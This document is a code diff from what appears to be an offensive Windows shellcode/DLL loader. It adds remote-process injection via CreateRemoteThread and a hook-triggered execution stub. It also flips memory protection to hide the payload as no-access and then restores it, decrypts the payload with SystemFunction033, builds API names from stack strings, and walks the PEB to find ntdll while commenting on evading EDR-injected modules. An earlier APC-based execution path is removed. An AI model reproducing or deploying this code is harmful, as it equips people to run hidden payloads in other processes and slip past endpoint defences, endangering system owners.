-    PIMAGE_DOS_HEADER dosHeader1 = (PIMAGE_DOS_HEADER)fileBase;
-    PIMAGE_NT_HEADERS ntHeader1 = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader1->e_lfanew);
-    DWORD entryPointRVA1 = ntHeader1->OptionalHeader.AddressOfEntryPoint;
-    // //Write to .text section
-    PVOID dllEntryPoint1 = (PVOID)(entryPointRVA1 + (DWORD_PTR)fileBase);
-
-    PIMAGE_TLS_CALLBACK *callback_decoy;
-    PIMAGE_DATA_DIRECTORY tls_entry_decoy = &ntHeader1->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
-
-    if(tls_entry_decoy->Size) {
-        PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)fileBase + tls_entry_decoy->VirtualAddress);
-        callback_decoy = (PIMAGE_TLS_CALLBACK *)(tls_dir_decoy->AddressOfCallBacks);
-        for(; *callback_decoy; callback_decoy++)
-            (*callback_decoy)((LPVOID)fileBase, DLL_PROCESS_ATTACH, NULL);
-    }
-    // Use function pointer to call the DLL entry point 2nd time.
-    DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)fileBase + entryPointRVA1);
-    // (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
 
     const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
-    RtlDispatchAPC_t RtlDispatchAPC = (RtlDispatchAPC_t)dynamic::NotGetProcAddress(GetModuleHandleA(getLib), MAKEINTRESOURCE(8));
-    if(!RtlDispatchAPC) {
-        printf("[-] Failed to locate RtlDispatchAPC.\n");
-        return 1;
+
+    if(bRemoteInjection) {
+
+
+        // // This is for execution method 1: 
+        // if(bUseNoAccess) {
+        //     // //change the memory protection back to PAGE_EXECUTE_READ:
+        //         status = NtProtectVirtualMemory(
+        //         hProcess,
+        //         &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
+        //         &regionSize, // A pointer to the size of the region
+        //         PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
+        //         // PAGE_EXECUTE_WRITECOPY, 
+        //         &oldProtect); // The old protection attributes
+        //     if(status != STATUS_SUCCESS) {
+        //         printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
+        //     } else {
+        //         printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
+        //     }
+        // }
+
+        // // use createRemoteThread to call remoteEntryPoint: 
+
+        // // // Create a thread in the remote process that starts execution at the remote DLL entry point
+        // // We can put the thread in alterable state and ask it to have a start address at anywhere we like. 
+        // HANDLE hThread = CreateRemoteThread(
+        //     hProcess,                    // Handle to the remote process
+        //     NULL,                        // No security attributes
+        //     0,                           // Default stack size
+        //     (LPTHREAD_START_ROUTINE)0x1337,  // Entry point of the remote DLL
+        //     NULL,                        // No arguments to pass
+        //     CREATE_SUSPENDED,                           // No special flags
+        //     NULL                         // Don't need the thread ID
+        // );
+
+        
+
+
+
+        // // if (hThread == NULL) {
+        // //     printf("Failed to create remote thread. Error: %x\n", GetLastError());
+        // //     return 1;
+        // // } else { 
+        // //     printf("[+] Remote thread created successfully at address: %p\n", dllEntryPoint);
+        // // }
+
+
+        // // // Wait for the thread to finish executing
+        // // WaitForSingleObject(hThread, INFINITE);
+
+        // // TODO: now, use other method to call remote DLL entry point: 
+
+        // // RtlDispatchAPC_t RtlDispatchAPC = (RtlDispatchAPC_t)dynamic::NotGetProcAddress(GetModuleHandleA(getLib), MAKEINTRESOURCE(8));
+        // // if(!RtlDispatchAPC) {
+        // //     printf("[-] Failed to locate RtlDispatchAPC.\n");
+        // //     return 1;
+        // // } else {
+        // //     printf("[+] RtlDispatchAPC located.\n");
+        // //     //print the func addr:
+        // //     printf("[+] RtlDispatchAPC: %p\n", RtlDispatchAPC);
+        // // }
+
+        // // // call RtlDispatchAPC to execute DllEntry1:
+        // // // Prepare the arguments for RtlDispatchAPC
+        // // PAPCFUNC apcFunction = (PAPCFUNC)dllEntryPoint;
+        // // ULONG_PTR apcArgument1 = (ULONG_PTR)fileBaseRemote;
+        // // APC_ACTIVATION_CTX apcArgument2;
+        // // apcArgument2.Value = 0; // Initialize the union as needed
+
+        // // // Call RtlDispatchAPC with the prepared arguments
+        // // printf("[+] Calling RtlDispatchAPC to execute DllEntry.\n");
+        // // result = RtlDispatchAPC(apcFunction, apcArgument1, apcArgument2);
+
+        // // if(result != STATUS_SUCCESS) {
+        // //     printf("[-] RtlDispatchAPC failed to execute DllEntry1. Status: %x\n", result);
+        // //     return 1;
+        // // } else {
+        // //     printf("[+] DllEntry1 executed successfully.\n");
+        // // }
+        // // //pass RtlDispatchAPC_t to pNtQueueApcThread to call DllEntry1:
+        // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
+        // NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
+
+        // // // // Prepare the arguments for NtQueueApcThreadEx2
+        // // // HANDLE hThread = GetCurrentThread();
+        // HANDLE userApcReserveHandle = NULL; // Adjust as necessary
+        // QUEUE_USER_APC_FLAGS queueUserApcFlags = QUEUE_USER_APC_FLAGS_NONE;
+
+        // // Call NtQueueApcThreadEx2 with the prepared arguments
+        // // result = pNtQueueApcThread(
+        // //     hThread,
+        // //     userApcReserveHandle,
+        // //     queueUserApcFlags,
+        // //     (PVOID)RtlDispatchAPC,
+        // //     (PVOID)apcFunction,
+        // //     (PVOID)apcArgument1,
+        // //     (PVOID)&apcArgument2
+        // // ); 
+        // result = pNtQueueApcThread(
+        //     hThread,
+        //     userApcReserveHandle,
+        //     queueUserApcFlags,
+        //     (PVOID)dllEntryPoint,
+        //     NULL,
+        //     (PVOID)NULL,
+        //     (PVOID)NULL
+        // ); 
+        // if(result != STATUS_SUCCESS) {
+        //     printf("[-] NtQueueApcThreadEx2 failed to execute DllEntry1. Status: %x\n", result);
+        //     return 1;
+        // } else {
+        //     printf("[+] DllEntry executed successfully.\n");
+        // }
+
+        // // resume thread:
+        // DWORD dwResumeResult = ResumeThread(hThread);
+        // if (dwResumeResult == (DWORD)-1) {
+        //     printf("Failed to resume remote thread. Error: %x\n", GetLastError());
+
+        // } else {
+        //     printf("[+] Thread resumed. /n");
+        // }
+
+
+        // alternative execution method: 
+        DLLEntry DllEntry1 = (DLLEntry)(dllEntryPoint);
+        // (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
+        DllEntryGlobal = DllEntry1;
+        fileBaseGlobal = fileBase;
+
+
+        // install hook
+        printf("[!] Installing hook...\n\n");
+        if(InstallHookRemote() != 0)
+        {
+            return 1;
+        }
+
+        printf("[+] press any key to continue\n");
+        getchar();
+
+        pRtlExitUserThread ExitThread = (pRtlExitUserThread)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "RtlExitUserThread");
+
+
+        // TODO: we can put this into hooked stub. For remote injection, we are temporarily put this here. 
+        if(bUseNoAccess) {
+            // // //change the memory protection back to PAGE_EXECUTE_READ:
+            //     status = NtProtectVirtualMemory(
+            //     hProcess,
+            //     &dllEntryPoint, // NtProtectVirtualMemory expects a pointer to the base address
+            //     &regionSize, // A pointer to the size of the region
+            //     PAGE_READWRITE, // The new protection attributes, PAGE_EXECUTE_READ
+            //     // PAGE_EXECUTE_WRITECOPY, 
+            //     &oldProtect); // The old protection attributes
+            // if(status != STATUS_SUCCESS) {
+            //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
+            // } else {
+            //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
+            // }
+
+            /// TODO: use RtlRemoteCall or other inter process communication to call decryption stub  in remote proc to 
+            /// restore the memory access and decrypt the payload.
+            
+            // initialize_data((char*)dllEntryPoint, regionSize); 
+            // // write stack string for SystemFunction033:
+            // const char sysfunc33Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '3', 0 };
+            // SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc33Char);
+            // NTSTATUS eny = SystemFunction033(&pData, &pKey);
+            // if(eny != STATUS_SUCCESS) {
+            //     printf("[-] SystemFunction033 failed to encrypt the data. Status: %x\n", eny);
+            // } else {
+            //     printf("[+] SystemFunction033 succeeded to encrypt the data.\n");
+            // }
+            // printf("[+] Restoring payload memory access and decrypting with XOR. \n");
+            // DWORD oldPal = 0;
+            // // Change the memory back to XR for execution...
+            // sUrprise((char *) dllEntryPoint, regionSize, key, sizeof(key));
+        }
+
+
+
+        // TODO: we can put this into hooked stub.
+        if(bUseNoAccess) {
+            // //change the memory protection back to PAGE_EXECUTE_READ:
+                status = NtProtectVirtualMemory(
+                hProcess,
+                &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
+                &regionSize, // A pointer to the size of the region
+                PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
+                // PAGE_EXECUTE_WRITECOPY, 
+                &oldProtect); // The old protection attributes
+            if(status != STATUS_SUCCESS) {
+                printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
+            } else {
+                printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
+            }
+        }
+
+        // create a thread to call ExitThread, not hooked function:
+        HANDLE hThread = NULL;
+        DWORD threadId = 0;
+
+        hThread = CreateRemoteThread(
+                hProcess,          // Handle to the target process
+                NULL,              // Default security attributes
+                0,                 // Stack size (0 = default)
+                (LPTHREAD_START_ROUTINE)ExitThread,  // Thread start routine (ExitThread)
+                NULL,              // Thread parameter (None, since ExitThread takes no parameters)
+                0,                 // Creation flags
+                &threadId          // Thread ID
+        );
+
+        if (hThread == NULL) {
+            printf("Failed to create thread. Error: %x\n", GetLastError());
+            return 1;
+        } else {
+            printf("[+] Thread created successfully.\n");
+        } 
+
+        // Optionally, wait for the remote thread to finish execution
+        WaitForSingleObject(hThread, INFINITE);
     } else {
-        printf("[+] RtlDispatchAPC located.\n");
-        //print the func addr:
-        printf("[+] RtlDispatchAPC: %p\n", RtlDispatchAPC);
+
+
+
+        DLLEntry DllEntry1 = (DLLEntry)(dllEntryPoint);
+        if(!bUseNoAccess) {
+            (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
+        } 
+        else 
+        {
+            DllEntryGlobal = DllEntry1;
+            fileBaseGlobal = fileBase;
+
+
+            // install hook
+            printf("[!] Installing hook...\n\n");
+            if(InstallHook() != 0)
+            {
+                return 1;
+            }
+
+            pRtlExitUserThread ExitThread = (pRtlExitUserThread)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "RtlExitUserThread");
+
+            // create a thread to call ExitThread, not hooked function:
+            HANDLE hThread = NULL;
+            DWORD threadId = 0;
+            hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitThread, NULL, 0, &threadId);
+            if (hThread == NULL) {
+                printf("Failed to create thread. Error: %x\n", GetLastError());
+                return 1;
+            } else {
+                printf("[+] Thread created successfully.\n");
+            }
+            // wait for 
+            WaitForSingleObject(hThread, INFINITE);
+        }
+        
+        
+        
+
     }
-
-    // call RtlDispatchAPC to execute DllEntry1:
-    // Prepare the arguments for RtlDispatchAPC
-    PAPCFUNC apcFunction = (PAPCFUNC)DllEntry1;
-    ULONG_PTR apcArgument1 = (ULONG_PTR)fileBase;
-    APC_ACTIVATION_CTX apcArgument2;
-    apcArgument2.Value = 0; // Initialize the union as needed
-
-    // Call RtlDispatchAPC with the prepared arguments
-    printf("[+] Calling RtlDispatchAPC to execute DllEntry.\n");
-    result = RtlDispatchAPC(apcFunction, apcArgument1, apcArgument2);
-
-    if(result != STATUS_SUCCESS) {
-        printf("[-] RtlDispatchAPC failed to execute DllEntry1. Status: %x\n", result);
-        return 1;
-    } else {
-        printf("[+] DllEntry1 executed successfully.\n");
-    }
-    //pass RtlDispatchAPC_t to pNtQueueApcThread to call DllEntry1:
-    // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
-    // NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
-
-    // // Prepare the arguments for NtQueueApcThreadEx2
-    // HANDLE hThread = GetCurrentThread();
-    // HANDLE userApcReserveHandle = NULL; // Adjust as necessary
-    // QUEUE_USER_APC_FLAGS queueUserApcFlags = QUEUE_USER_APC_FLAGS_NONE;
-
-    // // Call NtQueueApcThreadEx2 with the prepared arguments
-    // result = pNtQueueApcThread(
-    //     hThread,
-    //     userApcReserveHandle,
-    //     queueUserApcFlags,
-    //     (PVOID)RtlDispatchAPC,
-    //     (PVOID)apcFunction,
-    //     (PVOID)apcArgument1,
-    //     (PVOID)&apcArgument2
-    // ); 
-    // if(result != STATUS_SUCCESS) {
-    //     printf("[-] NtQueueApcThreadEx2 failed to execute DllEntry1. Status: %x\n", result);
-    //     return 1;
-    // } else {
-    //     printf("[+] DllEntry1 executed successfully.\n");
-    // }
-
-
-    
-
     // CloseHandle(hThread);
     // FreeLibrary(hDll);
     // if(bUseLdrLoadDll) {
@@ -1835,7 +2820,6 @@ int main(int argc, char *argv[])
     // Terminate the process
     // ExitProcess(0);
     return 0;
-
 
 
 }
@@ -1887,35 +2871,212 @@ BOOL PrintSectionDetails(const wchar_t* dllPath) {
 }
 
 
-void DisableDebugPrivilege() {
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
+void hooked_function() {
+    printf("[^_^] VMT hooked pointer called.\n");
 
-    // Open the access token for the current process
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        printf("Failed to open process token. Error: %d\n", GetLastError());
-        return;
+    printf("[-_-] press any key to continue\n");
+    getchar();
+
+    hProcess = GetCurrentProcess();
+    ULONG oldProtect;
+
+    // if VMT is used, we do PAGE change here: 
+        // TODO: we can put this into hooked stub.
+
+    NTSTATUS status;
+    // TODO: we can put this into hooked stub.
+    if(bUseNoAccess) {
+        // //change the memory protection back to PAGE_EXECUTE_READ:
+            status = NtProtectVirtualMemory(
+            hProcess,
+            &dllEntryPoint, // NtProtectVirtualMemory expects a pointer to the base address
+            &regionSize, // A pointer to the size of the region
+            PAGE_READWRITE, // The new protection attributes, PAGE_EXECUTE_READ
+            // PAGE_EXECUTE_WRITECOPY, 
+            &oldProtect); // The old protection attributes
+        if(status != STATUS_SUCCESS) {
+            printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
+        } else {
+            printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
+        }
+
+        // initialize_data((char*)dllEntryPoint, regionSize); 
+        // write stack string for SystemFunction033:
+        const char sysfunc33Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '3', 0 };
+        SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc33Char);
+        status = SystemFunction033(&pData, &pKey);
+        if(status != STATUS_SUCCESS) {
+            printf("[-] SystemFunction033 failed to decrypt the data. Status: %x\n", status);
+        } else {
+            printf("[+] SystemFunction033 succeeded to decrypt the data.\n");
+        }
+        printf("[+] Restoring payload memory access and decrypting\n");
+        // DWORD oldPal = 0;
+        // // Change the memory back to XR for execution...
+        // sUrprise((char *) dllEntryPoint, regionSize, key, sizeof(key));
+    
+
+        // //change the memory protection back to PAGE_EXECUTE_READ:
+            status = NtProtectVirtualMemory(
+            hProcess,
+            &dllEntryPoint, // NtProtectVirtualMemory expects a pointer to the base address
+            &regionSize, // A pointer to the size of the region
+            PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
+            // PAGE_EXECUTE_WRITECOPY, 
+            &oldProtect); // The old protection attributes
+        if(status != STATUS_SUCCESS) {
+            printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
+        } else {
+            printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
+        }
     }
 
-    // Look up the LUID for the debug privilege
-    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
-        printf("Failed to lookup debug privilege. Error: %d\n", GetLastError());
-        CloseHandle(hToken);
-        return;
-    }
+    printf("[-_-] press any key to continue\n");
+    getchar();
 
-    // Disable the privilege by setting its attributes to 0
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = 0;
+    // m1: 
+    // (*DllEntryGlobal)((HINSTANCE)fileBaseGlobal, DLL_PROCESS_ATTACH, 0);
+    (*DllEntryGlobal)((HINSTANCE)fileBaseGlobal, DLL_THREAD_DETACH, 0);
+    // m2: 
+    // void (*magiccode_func)() = (void (*)())DllEntryGlobal;
+    // magiccode_func();
+    
 
-    // Adjust the token privileges
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
-        printf("Failed to adjust token privileges. Error: %d\n", GetLastError());
+}
+
+
+ADDR *GetNtdllBase() {
+
+    //1st method: 
+    // void *ntdllBase = NULL;
+    // PPEB_LDR_DATA ldr = NULL;
+    // PPEB pPEB = NULL;
+
+    /// get PEB: 
+    // #ifdef _WIN64
+    //     pPEB = (PPEB)__readgsqword(0x60); // Read PEB address from the GS segment register
+    // #else
+    //     pPEB = (PPEB)__readfsdword(0x30); // Read PEB address from the FS segment register
+    // #endif
+
+    // #ifdef _WIN64
+    //     __asm__ volatile (
+    //         "movq %%gs:0x60, %0" // Read PEB address from the GS segment register, PEB is pointed by a pointer at offset 0x60 to the TEB. 
+    //         : "=r" (pPEB)
+    //     );
+    // #else
+    //     __asm__ volatile (
+    //         "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
+    //         : "=r" (pPEB)
+    //     );
+    // #endif
+    // // Walk PEB: 
+    // DWORD64 qwNtdllBase = (DWORD64)pPEB->Ldr & ~(0x10000 - 1); //Align the Ldr addr to 64kb boundary. 
+    // while (1) {
+    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
+    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) { // contain valid DOS header? 
+    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
+    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {  //Valid NT header? 
+    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase); //First valid module is ntdll.dll
+    //             return (ADDR*)qwNtdllBase;
+    //         }
+    //     }
+    //     qwNtdllBase -= 0x10000; //Windows loader aligns DLLs to 64kb boundary to simplify address space layout. 
+    //     if (qwNtdllBase == 0) {
+    //         printf("[-] Ntdll base address not found\n");
+    //         return 0;
+    //     }
+    // }
+
+    //2nd: 
+    // while (1) {
+    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
+    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
+    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
+    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE && ntHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase);
+    //             return (ADDR*)qwNtdllBase;
+    //         }
+    //     }
+    //     qwNtdllBase -= 0x10000;
+    //     if (qwNtdllBase == 0) {
+    //         printf("[-] Ntdll base address not found\n");
+    //         return 0;
+    //     }
+    // }
+
+    
+    //2nd method: 
+    void *ntdllBase = NULL;
+    PPEB_LDR_DATA ldr = NULL;
+    PPEB pPEB = NULL;
+    PLDR_DATA_TABLE_ENTRY_FREE dte = NULL;
+
+    #ifdef _WIN64
+        __asm__ volatile (
+            "movq %%gs:0x60, %0" // Read PEB address from the GS segment register
+            : "=r" (pPEB)
+        );
+    #else
+        __asm__ volatile (
+            "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
+            : "=r" (pPEB)
+        );
+    #endif
+
+    // Get PEB_LDR_DATA
+    ldr = pPEB->Ldr;
+
+    // // Iterate through InMemoryOrderModuleList to find ntdll.dll
+    // LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
+    // LIST_ENTRY* current = head->Flink;
+
+    // while (current != head) {
+    //     dte = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
+
+    //     // Print the base address and name of each module
+    //     wprintf(L"Module: %ls, Base Address: %p\n", dte->BaseDllName.Buffer, dte->DllBase);
+
+    //     // Check if the BaseDllName matches "ntdll.dll"
+    //     if (wcscmp(dte->BaseDllName.Buffer, L"ntdll.dll") == 0) {
+    //         ntdllBase = dte->DllBase;
+    //         break;
+    //     }
+
+    //     current = current->Flink;
+    // }
+
+    // Get the 2nd entry in the InMemoryOrderModuleList, but if EDR injects fake DLL, it will not be the 2nd entry.
+
+    // Get the first entry (the application itself)
+    LIST_ENTRY* firstEntry = ldr->InMemoryOrderModuleList.Flink;
+    // Get the second entry (ntdll.dll)
+    LIST_ENTRY* secondEntry = firstEntry->Flink;
+
+    // Get the LDR_DATA_TABLE_ENTRY_FREE for ntdll.dll
+    dte = CONTAINING_RECORD(secondEntry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
+
+    ntdllBase = dte->DllBase;
+
+    // /// OR check the string name of the module:
+    // LIST_ENTRY* current = Ldr->InMemoryOrderModuleList; // Get the first entry in the list of loaded modules
+    // do {
+    //     current = current->Flink; // Move to the next entry
+    //     MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    //     char dllName[256]; // Buffer to store the name of the DLL
+    //     // Assuming FullDllName is a UNICODE_STRING, conversion to char* may require more than snprintf, consider proper conversion
+    //     snprintf(dllName, sizeof(dllName), "%wZ", entry->FullDllName);
+    //     if (strstr(dllName, "ntdll.dll")) { // Check if dllName contains "ntdll.dll"
+    //         return entry->DllBase; // Return the base address of ntdll.dll
+    //     }
+    // } while (current != Ldr->InMemoryOrderModuleList); // Loop until we reach the first entry again
+
+
+    if (ntdllBase != NULL) {
+        printf("[+] Ntdll base address found: %p\n", ntdllBase);
     } else {
-        printf("Debug privilege disabled successfully.\n");
+        printf("[-] Ntdll base address not found\n");
     }
 
-    CloseHandle(hToken);
+    return (ADDR*)ntdllBase;
 }
